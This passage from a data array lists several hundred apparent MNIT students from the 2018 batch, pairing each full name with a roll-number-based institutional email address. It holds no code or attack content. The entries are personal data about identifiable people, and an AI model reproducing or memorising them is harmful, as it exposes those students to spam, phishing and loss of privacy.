            {mail: '2018UCP1478@mnit.ac.in',
            name: 'DESHPRIYA'},
            
            
            {mail: '2018UCP1479@mnit.ac.in',
            name: 'SIDDHARTH SINGH'},
            
            
            {mail: '2018UCP1481@mnit.ac.in',
            name: 'SAMYAK JAIN'},
            
            
            {mail: '2018UCP1482@mnit.ac.in',
            name: 'HEET VINOD SURANA'},
            
            
            {mail: '2018UCP1483@mnit.ac.in',
            name: 'CHITRANSH JEENGAR'},
            
            
            {mail: '2018UCP1484@mnit.ac.in',
            name: 'ATIV KUMAR'},
            
            
            {mail: '2018UCP1485@mnit.ac.in',
            name: 'BALKRISHAN SEHRA'},
            
            
            {mail: '2018UCP1489@mnit.ac.in',
            name: 'MAYANK KALSAN'},
            
            
            {mail: '2018UCP1490@mnit.ac.in',
            name: 'YASH JAIN'},
            
            
            {mail: '2018UCP1491@mnit.ac.in',
            name: 'VINUSH VISHWANATH'},
            
            
            {mail: '2018UCP1495@mnit.ac.in',
            name: 'YERUBUNTI HIMA SOWJANYA'},
            
            
            {mail: '2018UCP1497@mnit.ac.in',
            name: 'TAVISH VIJAY'},
            
            
            {mail: '2018UCP1498@mnit.ac.in',
            name: 'HIMANSHU VERMA'},
            
            
            {mail: '2018UCP1500@mnit.ac.in',
            name: 'HARDIK SINGHAL'},
            
            
            {mail: '2018UCP1502@mnit.ac.in',
            name: 'SATYAJIT ROY'},
            
            
            {mail: '2018UCP1503@mnit.ac.in',
            name: 'SHASHIKANT MOURYA'},
            
            
            {mail: '2018UCP1505@mnit.ac.in',
            name: 'ASHUTOSH SONI'},
            
            
            {mail: '2018UCP1506@mnit.ac.in',
            name: 'MOHIT KUMAR'},
            
            
            {mail: '2018UCP1507@mnit.ac.in',
            name: 'SUJEET KUMAR SHARMA'},
            
            
            {mail: '2018UCP1509@mnit.ac.in',
            name: 'ADITYA KUMAWAT'},
            
            
            {mail: '2018UCP1513@mnit.ac.in',
            name: 'ANKIT DOOT'},
            
            
            {mail: '2018UCP1514@mnit.ac.in',
            name: 'SUNITA'},
            
            
            {mail: '2018UCP1556@mnit.ac.in',
            name: 'HEMANT BAJAJ'},
            
            
            {mail: '2018UCP1581@mnit.ac.in',
            name: 'VAIBHAV AGARWAL'},
            
            
            {mail: '2018UCP1601@mnit.ac.in',
            name: 'ANURAG JAIN'},
            
            
            {mail: '2018UCP1620@mnit.ac.in',
            name: 'PURVA DAGA'},
            
            
            {mail: '2018UCP1655@mnit.ac.in',
            name: 'CHIRAG DUA'},
            
            
            {mail: '2018UCP1658@mnit.ac.in',
            name: 'NIDHI HEMANT MITKARI'},
            
            
            {mail: '2018UCP1672@mnit.ac.in',
            name: 'KAPIL KANSAL'},
            
            
            {mail: '2018UCP1673@mnit.ac.in',
            name: 'DIVYA KRIPLANI'},
            
            
            {mail: '2018UCP1674@mnit.ac.in',
            name: 'KESHAV GARG'},
            
            
            {mail: '2018UCP1678@mnit.ac.in',
            name: 'JANHVI GAUR'},
            
            
            {mail: '2018UCP1691@mnit.ac.in',
            name: 'SOMYA GUPTA'},
            
            
            {mail: '2018UCP1696@mnit.ac.in',
            name: 'DHARMENDER'},
            
            
            {mail: '2018UCP1700@mnit.ac.in',
            name: 'ABHINAV AGGARWAL'},
            
            
            {mail: '2018UCP1708@mnit.ac.in',
            name: 'PRADEEP PATIL'},
            
            
            {mail: '2018UCP1710@mnit.ac.in',
            name: 'JATIN'},
            
            
            {mail: '2018UCP1712@mnit.ac.in',
            name: 'ABDULLAH JAMAL'},
            
            
            {mail: '2018UCP1737@mnit.ac.in',
            name: 'TRIYA BYADWAL'},
            
            
            {mail: '2018UCP1744@mnit.ac.in',
            name: 'AKSHIT AGARAWAL'},
            
            
            {mail: '2018UCP1756@mnit.ac.in',
            name: 'ASHUTOSH MOHANTA'},
            
            
            {mail: '2018UCP1782@mnit.ac.in',
            name: 'ROHIT KUMAR'},
            
            
            {mail: '2018UCP1789@mnit.ac.in',
            name: 'PIYUSH VERMA'},
            
            
            {mail: '2018UCP1797@mnit.ac.in',
            name: 'RACHIT GUPTA'},
            
            
            {mail: '2018UCP1813@mnit.ac.in',
            name: 'ADNAN KHAN'},
            
            
            {mail: '2018UEC1001@mnit.ac.in',
            name: 'VISHAL SINGH'},
            
            
            {mail: '2018UEC1005@mnit.ac.in',
            name: 'VISHWAS BANSAL'},
            
            
            {mail: '2018UEC1007@mnit.ac.in',
            name: 'ANSHUM'},
            
            
            {mail: '2018UEC1008@mnit.ac.in',
            name: 'ANUJA PATHAK'},
            
            
            {mail: '2018UEC1009@mnit.ac.in',
            name: 'RESHAM CHAWRA'},
            
            
            {mail: '2018UEC1012@mnit.ac.in',
            name: 'ANKIT KATARIA'},
            
            
            {mail: '2018UEC1013@mnit.ac.in',
            name: 'HARSHIT VERMA'},
            
            
            {mail: '2018UEC1015@mnit.ac.in',
            name: 'AKASH CHAUDHARY'},
            
            
            {mail: '2018UEC1016@mnit.ac.in',
            name: 'SUNIL MEENA'},
            
            
            {mail: '2018UEC1018@mnit.ac.in',
            name: 'ROHIT MEENA'},
            
            
            {mail: '2018UEC1020@mnit.ac.in',
            name: 'RUPESH YADAV'},
            
            
            {mail: '2018UEC1022@mnit.ac.in',
            name: 'ISHIKA AGGARWAL'},
            
            
            {mail: '2018UEC1023@mnit.ac.in',
            name: 'SATYANARAYAN'},
            
            
            {mail: '2018UEC1025@mnit.ac.in',
            name: 'MUKUL GUPTA'},
            
            
            {mail: '2018UEC1026@mnit.ac.in',
            name: 'SHASHWAT CHAUHAN'},
            
            
            {mail: '2018UEC1031@mnit.ac.in',
            name: 'PRATEEK KADELA'},
            
            
            {mail: '2018UEC1032@mnit.ac.in',
            name: 'CHILAKALA NITHISH KUMAR'},
            
            
            {mail: '2018UEC1033@mnit.ac.in',
            name: 'TARUN SINGH TOMAR'},
            
            
            {mail: '2018UEC1036@mnit.ac.in',
            name: 'VISHVAS PRAJAPATI'},
            
            
            {mail: '2018UEC1037@mnit.ac.in',
            name: 'ABHINAV SINGH KUSHWAH'},
            
            
            {mail: '2018UEC1039@mnit.ac.in',
            name: 'SHIVAM KUMAR MODI'},
            
            
            {mail: '2018UEC1041@mnit.ac.in',
            name: 'GANESH AGGARWAL'},
            
            
            {mail: '2018UEC1042@mnit.ac.in',
            name: 'SAMYAK JAIN'},
            
            
            {mail: '2018UEC1044@mnit.ac.in',
            name: 'PRIYANSHI SHARMA'},
            
            
            {mail: '2018UEC1046@mnit.ac.in',
            name: 'DIVYANSH KUMAR SINGH'},
            
            
            {mail: '2018UEC1049@mnit.ac.in',
            name: 'ADITYA SHARMA'},
            
            
            {mail: '2018UEC1051@mnit.ac.in',
            name: 'SHUBHANKUR KUMAR'},
            
            
            {mail: '2018UEC1052@mnit.ac.in',
            name: 'ARUNA KUMARI'},
            
            
            {mail: '2018UEC1054@mnit.ac.in',
            name: 'ARYAN AGARWAL'},
            
            
            {mail: '2018UEC1056@mnit.ac.in',
            name: 'YATENDRA KUMAWAT'},
            
            
            {mail: '2018UEC1058@mnit.ac.in',
            name: 'VIPIN KUMAR'},
            
            
            {mail: '2018UEC1059@mnit.ac.in',
            name: 'KASA MAYUR'},
            
            
            {mail: '2018UEC1060@mnit.ac.in',
            name: 'RONAK NAINIWAL'},
            
            
            {mail: '2018UEC1061@mnit.ac.in',
            name: 'VISHAL SINGH'},
            
            
            {mail: '2018UEC1062@mnit.ac.in',
            name: 'SUMIT KUMAR GODWAN'},
            
            
            {mail: '2018UEC1068@mnit.ac.in',
            name: 'VEDANT GOYAL'},
            
            
            {mail: '2018UEC1078@mnit.ac.in',
            name: 'VAISHNAVI RATHOD'},
            
            
            {mail: '2018UEC1079@mnit.ac.in',
            name: 'HIPRANSHU BARGURJER'},
            
            
            {mail: '2018UEC1083@mnit.ac.in',
            name: 'SHREYASH BANSAL'},
            
            
            {mail: '2018UEC1104@mnit.ac.in',
            name: 'RITIK KUMAR SHARMA'},
            
            
            {mail: '2018UEC1113@mnit.ac.in',
            name: 'MANISH KUMAR GUPTA'},
            
            
            {mail: '2018UEC1174@mnit.ac.in',
            name: 'KARTIKEY SINGHAL'},
            
            
            {mail: '2018UEC1224@mnit.ac.in',
            name: 'KAPIL VARMA'},
            
            
            {mail: '2018UEC1225@mnit.ac.in',
            name: 'VISHAL THIRWANI'},
            
            
            {mail: '2018UEC1230@mnit.ac.in',
            name: 'JIYA SINGH'},
            
            
            {mail: '2018UEC1249@mnit.ac.in',
            name: 'SHWETA RAJPUT'},
            
            
            {mail: '2018UEC1290@mnit.ac.in',
            name: 'VIKRAM SINGH GURJAR'},
            
            
            {mail: '2018UEC1294@mnit.ac.in',
            name: 'MADA ROHITH REDDY'},
            
            
            {mail: '2018UEC1346@mnit.ac.in',
            name: 'AANCHAL JAIN'},
            
            
            {mail: '2018UEC1363@mnit.ac.in',
            name: 'DIPTESH KUMAR'},
            
            
            {mail: '2018UEC1366@mnit.ac.in',
            name: 'SUSHANT SINGH THAKUR'},
            
            
            {mail: '2018UEC1383@mnit.ac.in',
            name: 'VIRAT SINGH'},
            
            
            {mail: '2018UEC1396@mnit.ac.in',
            name: 'SHUBHAM KHANDELWAL'},
            
            
            {mail: '2018UEC1397@mnit.ac.in',
            name: 'KUSHAGRA KAPOOR'},
            
            
            {mail: '2018UEC1403@mnit.ac.in',
            name: 'KUNAL KUMAR CHOUHAN'},
            
            
            {mail: '2018UEC1426@mnit.ac.in',
            name: 'SHRISHTI RASTOGI'},
            
            
            {mail: '2018UEC1428@mnit.ac.in',
            name: 'ANUSHA JAIN'},
            
            
            {mail: '2018UEC1440@mnit.ac.in',
            name: 'DEVENDRA SINGH MEENA'},
            
            
            {mail: '2018UEC1441@mnit.ac.in',
            name: 'Jahnavi Chandrakar'},
            
            
            {mail: '2018UEC1468@mnit.ac.in',
            name: 'Harsh Surya Bhushan'},
            
            
            {mail: '2018UEC1477@mnit.ac.in',
            name: 'VINOD KHORWAL'},
            
            
            {mail: '2018UEC1504@mnit.ac.in',
            name: 'VAIBHAV PRAKASH SARAF'},
            
            
            {mail: '2018UEC1518@mnit.ac.in',
            name: 'RISHABH LINGAM'},
            
            
            {mail: '2018UEC1552@mnit.ac.in',
            name: 'AJMERA SACHIN'},
            
            
            {mail: '2018UEC1561@mnit.ac.in',
            name: 'SAKSHI DUGAR'},
            
            
            {mail: '2018UEC1571@mnit.ac.in',
            name: 'AADITYA RAJ'},
            
            
            {mail: '2018UEC1573@mnit.ac.in',
            name: 'PRAVEEN GAMI'},
            
            
            {mail: '2018UEC1579@mnit.ac.in',
            name: 'RAUSHAN KUMAR'},
            
            
            {mail: '2018UEC1582@mnit.ac.in',
            name: 'SUSHIL KUMAR'},
            
            
            {mail: '2018UEC1603@mnit.ac.in',
            name: 'AADARSH JAIN'},
            
            
            {mail: '2018UEC1615@mnit.ac.in',
            name: 'SACHIN YADAV'},
            
            
            {mail: '2018UEC1626@mnit.ac.in',
            name: 'SHIVAM GUPTA'},
            
            
            {mail: '2018UEC1639@mnit.ac.in',
            name: 'TAVISH NAIN'},
            
            
            {mail: '2018UEC1648@mnit.ac.in',
            name: 'RISHIK SURESH JASORIYA'},
            
            
            {mail: '2018UEC1650@mnit.ac.in',
            name: 'DHANNA RAM LALARIYA'},
            
            
            {mail: '2018UEC1652@mnit.ac.in',
            name: 'YAD RAM VERMA'},
            
            
            {mail: '2018UEC1675@mnit.ac.in',
            name: 'MANISH SINGH PATEL'},
            
            
            {mail: '2018UEC1694@mnit.ac.in',
            name: 'TARUN KUMAR BHARDWAJ'},
            
            
            {mail: '2018UEC1698@mnit.ac.in',
            name: 'GAURAV KUMAR'},
            
            
            {mail: '2018UEC1705@mnit.ac.in',
            name: 'BHUPENDRA SINGH POSWAL'},
            
            
            {mail: '2018UEC1719@mnit.ac.in',
            name: 'PALASH SHIRISH WANI'},
            
            
            {mail: '2018UEC1722@mnit.ac.in',
            name: 'AMIT SHARMA'},
            
            
            {mail: '2018UEC1731@mnit.ac.in',
            name: 'SANJANA TALREJA'},
            
            
            {mail: '2018UEC1733@mnit.ac.in',
            name: 'VINEET JOSHI'},
            
            
            {mail: '2018UEC1740@mnit.ac.in',
            name: 'SAGAR BHARTI'},
            
            
            {mail: '2018UEC1745@mnit.ac.in',
            name: 'HARSHITA MEENA'},
            
            
            {mail: '2018UEC1747@mnit.ac.in',
            name: 'ESHAAN GUPTA'},
            
            
            {mail: '2018UEC1759@mnit.ac.in',
            name: 'VAIBHAV JAIN'},
            
            
            {mail: '2018UEC1767@mnit.ac.in',
            name: 'SHUBHANKAR SHYAMAL'},
            
            
            {mail: '2018UEC1773@mnit.ac.in',
            name: 'RUPESH KUMAR'},
            
            
            {mail: '2018UEC1774@mnit.ac.in',
            name: 'SWATI SUMAN'},
            
            
            {mail: '2018UEC1777@mnit.ac.in',
            name: 'YASH JAIN'},
            
            
            {mail: '2018UEC1778@mnit.ac.in',
            name: 'LALIT AGRAWAL'},
            
            
            {mail: '2018UEC1779@mnit.ac.in',
            name: 'VAIBHAV SINGH BADGUZAR'},
            
            
            {mail: '2018UEC1790@mnit.ac.in',
            name: 'RAHUL KUMAR KUMAWAT'},
            
            
            {mail: '2018UEC1795@mnit.ac.in',
            name: 'ARUN MOHAN SHARMA'},
            
            
            {mail: '2018UEC1796@mnit.ac.in',
            name: 'KARMVEER SINGH'},
            
            
            {mail: '2018UEC1801@mnit.ac.in',
            name: 'SINGULURI SAI VAMSEE KRISHNA'},
            
            
            {mail: '2018UEC1806@mnit.ac.in',
            name: 'MUKUL JAIN'},
            
            
            {mail: '2018UEC1819@mnit.ac.in',
            name: 'RITU VERMA'},
            
            
            {mail: '2018UEE1017@mnit.ac.in',
            name: 'ADITYA RANA'},
            
            
            {mail: '2018UEE1021@mnit.ac.in',
            name: 'RISHIKA AGRAWAL'},
            
            
            {mail: '2018UEE1064@mnit.ac.in',
            name: 'HUSSAN ULLAH'},
            
            
            {mail: '2018UEE1084@mnit.ac.in',
            name: 'RISHABH DUBEY'},
            
            
            {mail: '2018UEE1092@mnit.ac.in',
            name: 'MRIDUL YADAV'},
            
            
            {mail: '2018UEE1126@mnit.ac.in',
            name: 'VAIBHAV MANI'},
            
            
            {mail: '2018UEE1152@mnit.ac.in',
            name: 'MD EZAZ AHMED'},
            
            
            {mail: '2018UEE1153@mnit.ac.in',
            name: 'SUNIL RUNDLA'},
            
            
            {mail: '2018UEE1194@mnit.ac.in',
            name: 'MAYANK'},
            
            
            {mail: '2018UEE1197@mnit.ac.in',
            name: 'TUSHAR NAYAK'},
            
            
            {mail: '2018UEE1200@mnit.ac.in',
            name: 'RANBIR KUMAR'},
            
            
            {mail: '2018UEE1212@mnit.ac.in',
            name: 'SACHIN SHARMA'},
            
            
            {mail: '2018UEE1231@mnit.ac.in',
            name: 'SNEHA YADAV'},
            
            
            {mail: '2018UEE1244@mnit.ac.in',
            name: 'VITTHAL AGARWAL'},
            
            
            {mail: '2018UEE1256@mnit.ac.in',
            name: 'LAKSHYA KHANDELWAL'},
            
            
            {mail: '2018UEE1275@mnit.ac.in',
            name: 'SARANSH AGARWAL'},
            
            
            {mail: '2018UEE1282@mnit.ac.in',
            name: 'HIMANSHU'},
            
            
            {mail: '2018UEE1284@mnit.ac.in',
            name: 'BHAWNA SOLANKI'},
            
            
            {mail: '2018UEE1285@mnit.ac.in',
            name: 'RAGHAV SALUJA'},
            
            
            {mail: '2018UEE1288@mnit.ac.in',
            name: 'NIKHIL PATEL'},
            
            
            {mail: '2018UEE1289@mnit.ac.in',
            name: 'MANURAJ VARSHNEY'},
            
            
            {mail: '2018UEE1291@mnit.ac.in',
            name: 'MAMDEEP KUMAR'},
            
            
            {mail: '2018UEE1292@mnit.ac.in',
            name: 'GARVIT CHITARA'},
            
            
            {mail: '2018UEE1296@mnit.ac.in',
            name: 'ANSHULI VERMA'},
            
            
            {mail: '2018UEE1297@mnit.ac.in',
            name: 'AMIT RAGHUWANSHI'},
            
            
            {mail: '2018UEE1299@mnit.ac.in',
            name: 'SURENDRA SINGH RATHORE'},
            
            
            {mail: '2018UEE1300@mnit.ac.in',
            name: 'SHIVAM GUPTA'},
            
            
            {mail: '2018UEE1301@mnit.ac.in',
            name: 'AYUSH KUMAR DUBEY'},
            
            
            {mail: '2018UEE1302@mnit.ac.in',
            name: 'ANKIT SHARMA'},
            
            
            {mail: '2018UEE1303@mnit.ac.in',
            name: 'SHIVANI AGRAWAL'},
            
            
            {mail: '2018UEE1304@mnit.ac.in',
            name: 'SIDDHARTH PARASHAR'},
            
            
            {mail: '2018UEE1306@mnit.ac.in',
            name: 'YASH AGARWAL'},
            
            
            {mail: '2018UEE1307@mnit.ac.in',
            name: 'HARKESH KUMAR'},
            
            
            {mail: '2018UEE1308@mnit.ac.in',
            name: 'PRASHANT KUMAR'},
            
            
            {mail: '2018UEE1309@mnit.ac.in',
            name: 'PUNIT SAINI'},
            
            
            {mail: '2018UEE1314@mnit.ac.in',
            name: 'ANJALI CHOUDHARY'},
            
            
            {mail: '2018UEE1316@mnit.ac.in',
            name: 'RAJAT AGRAWAL'},
            
            
            {mail: '2018UEE1318@mnit.ac.in',
            name: 'GANJI UDAY RISHI KUMAR'},
            
            
            {mail: '2018UEE1322@mnit.ac.in',
            name: 'MEENAKSHI SINGH'},
            
            
            {mail: '2018UEE1324@mnit.ac.in',
            name: 'ADITYA AMBWANI'},
            
            
            {mail: '2018UEE1326@mnit.ac.in',
            name: 'NIHAR AGNIBHOJ'},
            
            
            {mail: '2018UEE1331@mnit.ac.in',
            name: 'RAM NIWAS'},
            
            
            {mail: '2018UEE1335@mnit.ac.in',
            name: 'DHAIRYA SETHI'},
            
            
            {mail: '2018UEE1336@mnit.ac.in',
            name: 'ADARSH KUMAR SINGH'},
            
            
            {mail: '2018UEE1337@mnit.ac.in',
            name: 'BHANU PRAKASH SINGHAL'},
            
            
            {mail: '2018UEE1340@mnit.ac.in',
            name: 'KRISHNA MEENA'},
            
            
            {mail: '2018UEE1342@mnit.ac.in',
            name: 'GAURANG MATHUR'},
            
            
            {mail: '2018UEE1343@mnit.ac.in',
            name: 'MOHAMMED SAMEER KHAN'},
            
            
            {mail: '2018UEE1350@mnit.ac.in',
            name: 'RAJAT GUMBER'},
            
            
            {mail: '2018UEE1353@mnit.ac.in',
            name: 'SPANDAN PANKAJ PATIL'},
            
            
            {mail: '2018UEE1355@mnit.ac.in',
            name: 'ANURAG TYAGI'},
            
            
            {mail: '2018UEE1356@mnit.ac.in',
            name: 'SHUBHAM CHOUDHARY'},
            
            
            {mail: '2018UEE1357@mnit.ac.in',
            name: 'MOIDA SHASHANK JAIN'},
            
            
            {mail: '2018UEE1358@mnit.ac.in',
            name: 'MANAN BAFNA'},
            
            
            {mail: '2018UEE1359@mnit.ac.in',
            name: 'HRITHIK AGARWAL'},
            
            
            {mail: '2018UEE1361@mnit.ac.in',
            name: 'RUPAL AGRAWAL'},
            
            
            {mail: '2018UEE1362@mnit.ac.in',
            name: 'ANUSHA JAIN'},
            
            
            {mail: '2018UEE1364@mnit.ac.in',
            name: 'KOMAL RAJAWAT'},
            
            
            {mail: '2018UEE1367@mnit.ac.in',
            name: 'ENA CHOUDHARY'},
            
            
            {mail: '2018UEE1368@mnit.ac.in',
            name: 'NITESH CHANDEL'},
            
            
            {mail: '2018UEE1369@mnit.ac.in',
            name: 'RAHUL RODIYA'},
            
            
            {mail: '2018UEE1371@mnit.ac.in',
            name: 'SEEMA MEENA'},
            
            
            {mail: '2018UEE1372@mnit.ac.in',
            name: 'HIMANSHU VERMA'},
            
            
            {mail: '2018UEE1374@mnit.ac.in',
            name: 'YASH BHANDARI'},
            
            
            {mail: '2018UEE1380@mnit.ac.in',
            name: 'VIKRAM SINGH'},
            
            
            {mail: '2018UEE1384@mnit.ac.in',
            name: 'TARUSH CHANDRA'},
            
            
            {mail: '2018UEE1390@mnit.ac.in',
            name: 'ANIL SINGH RAWAT'},
            
            
            {mail: '2018UEE1393@mnit.ac.in',
            name: 'GAURAV BAHETI'},
            
            
            {mail: '2018UEE1395@mnit.ac.in',
            name: 'PREETI SINGHAL'},
            
            
            {mail: '2018UEE1409@mnit.ac.in',
            name: 'ALANKIT GUPTA'},
            
            
            {mail: '2018UEE1417@mnit.ac.in',
            name: 'AJAY KUMAR'},
            
            
            {mail: '2018UEE1418@mnit.ac.in',
            name: 'AASHISH VERMA'},
            
            
            {mail: '2018UEE1450@mnit.ac.in',
            name: 'ABHISHEK KUMAR MEENA'},
            
            
            {mail: '2018UEE1454@mnit.ac.in',
            name: 'SANTOSH KUMAR'},
            
            
            {mail: '2018UEE1467@mnit.ac.in',
            name: 'VISHNU SHARMA'},
            
            
            {mail: '2018UEE1524@mnit.ac.in',
            name: 'ABHINAV GUPTA'},
            
            
            {mail: '2018UEE1553@mnit.ac.in',
            name: 'MERAVATH BRAHMA'},
            
            
            {mail: '2018UEE1569@mnit.ac.in',
            name: 'ABHINANDAN'},
            
            
            {mail: '2018UEE1616@mnit.ac.in',
            name: 'GOURAV TRIPATHI'},
            
            
            {mail: '2018UEE1635@mnit.ac.in',
            name: 'ARUNENDRA DWIVEDI'},
            
            
            {mail: '2018UEE1647@mnit.ac.in',
            name: 'ROHIT NUNIA'},
            
            
            {mail: '2018UEE1683@mnit.ac.in',
            name: 'DHEERAVATH VIJAY BHASKAR'},
            
            
            {mail: '2018UEE1711@mnit.ac.in',
            name: 'VAIBHAV SINGH'},
            
            
            {mail: '2018UEE1715@mnit.ac.in',
            name: 'ABHISHEK SAHU'},
            
            
            {mail: '2018UEE1718@mnit.ac.in',
            name: 'RAVI YADAV'},
            
            
            {mail: '2018UEE1724@mnit.ac.in',
            name: 'AJAY KUMAR BAIRWA'},
            
            
            {mail: '2018UEE1727@mnit.ac.in',
            name: 'PRIYA ELIZABETH RAJU'},
            
            
            {mail: '2018UEE1738@mnit.ac.in',
            name: 'TIPARE ANUJA RAJESH'},
            
            
            {mail: '2018UEE1739@mnit.ac.in',
            name: 'RITIK SINGHAL'},
            
            
            {mail: '2018UEE1741@mnit.ac.in',
            name: 'PAWAN SIYAG'},
            
            
            {mail: '2018UEE1748@mnit.ac.in',
            name: 'HIMANIK PANCHAL'},
            
            
            {mail: '2018UEE1749@mnit.ac.in',
            name: 'TRIGUNATEET SRIVASTAV'},
            
            
            {mail: '2018UEE1761@mnit.ac.in',
            name: 'ABHISHEK KUMAR'},
            
            
            {mail: '2018UEE1784@mnit.ac.in',
            name: 'MADHUR PACHAURI'},
            
            
            {mail: '2018UEE1791@mnit.ac.in',
            name: 'VYOM GUPTA'},
            
            
            {mail: '2018UEE1793@mnit.ac.in',
            name: 'RINKU KUMARI'},
            
            
            {mail: '2018UEE1809@mnit.ac.in',
            name: 'AKHILESH DWIVEDI'},
            
            
            {mail: '2018UEE1812@mnit.ac.in',
            name: 'MONARCH'},
            
            
            {mail: '2018UME1034@mnit.ac.in',
            name: 'LOKESH KHATRI'},
            
            
            {mail: '2018UME1067@mnit.ac.in',
            name: 'DEVESH WADWANI'},
            
            
            {mail: '2018UME1094@mnit.ac.in',
            name: 'PRIYANKA GUPTA'},
            
            
            {mail: '2018UME1108@mnit.ac.in',
            name: 'ANURAG RAJ'},
            
            
            {mail: '2018UME1116@mnit.ac.in',
            name: 'SANJAY'},
            
            
            {mail: '2018UME1117@mnit.ac.in',
            name: 'ABHAS JAIN'},
            
            
            {mail: '2018UME1125@mnit.ac.in',
            name: 'SUMIT KUMAR'},
            
            
            {mail: '2018UME1137@mnit.ac.in',
            name: 'RAJAT SAHU'},
            
            
            {mail: '2018UME1145@mnit.ac.in',
            name: 'BHANU MOHINDRA'},
            
            
            {mail: '2018UME1150@mnit.ac.in',
            name: 'AMAN BISARIA'},
            
            
            {mail: '2018UME1151@mnit.ac.in',
            name: 'RISHABH GUPTA'},
            
            
            {mail: '2018UME1155@mnit.ac.in',
            name: 'SHUBHANGI'},
            
            
            {mail: '2018UME1160@mnit.ac.in',
            name: 'B VISHNU KIRAN'},
            
            
            {mail: '2018UME1168@mnit.ac.in',
            name: 'ANURAG SHARMA'},
            
            
            {mail: '2018UME1170@mnit.ac.in',
            name: 'AJAY YADAV'},
            
            
            {mail: '2018UME1178@mnit.ac.in',
            name: 'HIMANSHU YADAV'},
            
            
            {mail: '2018UME1180@mnit.ac.in',
            name: 'ROHIT KUMAR MEENA'},
            
            
            {mail: '2018UME1182@mnit.ac.in',
            name: 'HRISHIKESH DAS'},
            
            
            {mail: '2018UME1184@mnit.ac.in',
            name: 'PRASHANT SHAMBHU THAKUR'},
            
            
            {mail: '2018UME1185@mnit.ac.in',
            name: 'RISHIKESH LAVWANSHI'},
            
            
            {mail: '2018UME1186@mnit.ac.in',
            name: 'NISHA YADAV'},
            
            
            {mail: '2018UME1190@mnit.ac.in',
            name: 'HARSH SHUKLA'},
            
            
            {mail: '2018UME1202@mnit.ac.in',
            name: 'RISHABH GUPTA'},
            
            
            {mail: '2018UME1203@mnit.ac.in',
            name: 'JYOTHI JAYAKUMAR'},
            
            
            {mail: '2018UME1206@mnit.ac.in',
            name: 'ADWAIT PRAKASH MISHRA'},
            
            
            {mail: '2018UME1208@mnit.ac.in',
            name: 'NAVEEN GARHWAL'},
            
            
            {mail: '2018UME1209@mnit.ac.in',
            name: 'RAHUL KUMAR'},
            
            
            {mail: '2018UME1210@mnit.ac.in',
            name: 'PAWAR JAYENDRA RAJUBHAI'},
            
            
            {mail: '2018UME1211@mnit.ac.in',
            name: 'MAYANK VIMAL'},
            
            
            {mail: '2018UME1216@mnit.ac.in',
            name: 'SUSHIL YADAV'},
            
            
            {mail: '2018UME1217@mnit.ac.in',
            name: 'MASUM KUMAR PASWAN'},
            
            
            {mail: '2018UME1218@mnit.ac.in',
            name: 'ARUTHRA SENTHILVEL'},
            
            
            {mail: '2018UME1219@mnit.ac.in',
            name: 'ADITYA SINGH'},
            
            
            {mail: '2018UME1227@mnit.ac.in',
            name: 'SHIVDUTT MANDAL'},
            
            
            {mail: '2018UME1229@mnit.ac.in',
            name: 'AVINASH JONY'},
            
            
            {mail: '2018UME1233@mnit.ac.in',
            name: 'RAVINDRA SINGH'},
            
            
            {mail: '2018UME1234@mnit.ac.in',
            name: 'VISHAL MISHRA'},
            
            
            {mail: '2018UME1235@mnit.ac.in',
            name: 'NEELVARDHAN SINGH'},
            
            
            {mail: '2018UME1236@mnit.ac.in',
            name: 'SUSHIL SHARMA'},
            
            
            {mail: '2018UME1237@mnit.ac.in',
            name: 'NITESH YADAV'},
            
            
            {mail: '2018UME1238@mnit.ac.in',
            name: 'MAYANK SRIVASTAVA'},
            
            
            {mail: '2018UME1239@mnit.ac.in',
            name: 'DEEPAK JAKHAR'},
            
            
            {mail: '2018UME1240@mnit.ac.in',
            name: 'MANISH FULWANI'},
            
            
            {mail: '2018UME1241@mnit.ac.in',
            name: 'ARPIT MISHRA'},
            
            
            {mail: '2018UME1242@mnit.ac.in',
            name: 'DEEPAK AGARWAL'},
            
            
            {mail: '2018UME1243@mnit.ac.in',
            name: 'AJAY CHALAWARIYA'},
            
            
            {mail: '2018UME1245@mnit.ac.in',
            name: 'JAY RATHI'},
            
            
            {mail: '2018UME1247@mnit.ac.in',
            name: 'CHIRAG SARASWAT'},
            
            
            {mail: '2018UME1248@mnit.ac.in',
            name: 'HARSHIT CHOUDHARY'},
            
            
            {mail: '2018UME1250@mnit.ac.in',
            name: 'RAJ RAJESHWARI'},
            
            
            {mail: '2018UME1251@mnit.ac.in',
            name: 'NIKITA MATHUR'},
            
            
            {mail: '2018UME1252@mnit.ac.in',
            name: 'TANAY GUPTA'},
            
            
            {mail: '2018UME1253@mnit.ac.in',
            name: 'VIJAY KAMERIYA'},
            
            
            {mail: '2018UME1255@mnit.ac.in',
            name: 'SOUMYA RANJAN PRUSTY'},
            
            
            {mail: '2018UME1258@mnit.ac.in',
            name: 'MAHAVEER KUMAWAT'},
            
            
            {mail: '2018UME1260@mnit.ac.in',
            name: 'SHIVANSHU AGNIHOTRI'},
            
            
            {mail: '2018UME1261@mnit.ac.in',
            name: 'PRINCE KAJLA'},
            
            
            {mail: '2018UME1262@mnit.ac.in',
            name: 'SPARSH MAHARSHI'},
            
            
            {mail: '2018UME1264@mnit.ac.in',
            name: 'SARIKA MALANI'},
            
            
            {mail: '2018UME1266@mnit.ac.in',
            name: 'TARUN AGARWAL'},
            
            
            {mail: '2018UME1267@mnit.ac.in',
            name: 'BRIJRAJ'},
            
            
            {mail: '2018UME1268@mnit.ac.in',
            name: 'ANKIT KUMAR NYATI'},
            
            
            {mail: '2018UME1269@mnit.ac.in',
            name: 'ARVIND KUMAR VISHNOI'},
            
            
            {mail: '2018UME1271@mnit.ac.in',
            name: 'SARANSH SHARMA'},
            
            
            {mail: '2018UME1272@mnit.ac.in',
            name: 'AMAN GOYAL'},
            
            
            {mail: '2018UME1274@mnit.ac.in',
            name: 'RAHUL KUMAR'},
            
            
            {mail: '2018UME1278@mnit.ac.in',
            name: 'KULDEEP SONI'},
            
            
            {mail: '2018UME1293@mnit.ac.in',
            name: 'RAHUL CHAUDHARY'},
            
            
            {mail: '2018UME1341@mnit.ac.in',
            name: 'MOHAMMED SHAHID'},
            
            
            {mail: '2018UME1344@mnit.ac.in',
            name: 'RAJAT GOYAL'},
            
            
            {mail: '2018UME1345@mnit.ac.in',
            name: 'YASHSWINI KABRA'},
            
            
            {mail: '2018UME1370@mnit.ac.in',
            name: 'DINESH SINGH'},
            
            
            {mail: '2018UME1377@mnit.ac.in',
            name: 'NEERAJ HARESH PRABHU'},
            
            
            {mail: '2018UME1392@mnit.ac.in',
            name: 'SAHAJ SANJAY PHALORH'},
            
            
            {mail: '2018UME1399@mnit.ac.in',
            name: 'NIKHIL SHARMA'},
            
            
